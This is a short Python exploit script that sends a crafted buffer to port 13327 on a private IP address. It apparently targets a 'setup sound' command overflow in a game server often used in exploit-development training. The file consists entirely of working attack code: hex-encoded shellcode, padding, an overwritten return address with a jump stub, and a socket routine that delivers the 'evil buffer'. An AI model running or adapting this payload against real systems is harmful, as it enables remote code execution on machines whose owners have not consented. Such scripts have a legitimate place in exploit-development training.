#!/usr/bin/env python3

import socket


TARGET_IP                    =    "192.168.1.65"

shellcode = ("\xbd\x42\x5d\xe0\x97\xda\xde\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
"\x14\x31\x6a\x14\x03\x6a\x14\x83\xc2\x04\xa0\xa8\xd1\x4c\xd3"
"\xb0\x41\x30\x48\x5d\x64\x3f\x8f\x11\x0e\xf2\xcf\x09\x91\x5e"
"\xa7\xaf\x2d\x5e\xc3\xda\x3d\x31\x7b\x92\xdf\xdb\x1d\xfc\xd2"
"\x9c\x68\xbd\xe8\x2f\x6e\x8e\x97\x82\xee\xad\xe7\x7b\x23\xb1"
"\x9b\xdd\xd1\x8d\xc3\x10\xa5\xbb\x8a\x52\xcd\x14\x42\xd0\x65"
"\x03\xb3\x74\x1c\xbd\x42\x9b\x8e\x12\xdc\xbd\x9e\x9e\x13\xbd")

ret =   "\x41" * (4368 - 105) + "\x97\x45\x13\x08" + "\x83\xc0\x0c\xff\xe0\x90\x90"
buffer = "\x11(setup sound " +  shellcode + ret + "\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("[*]Sending evil buffer...")
s.connect((TARGET_IP, 13327))
data = s.recv(1024)
print(data.decode("ISO-8859-1"))
s.send(buffer.encode("ISO-8859-1"))
s.close()
print("[*]Payload Sent !")
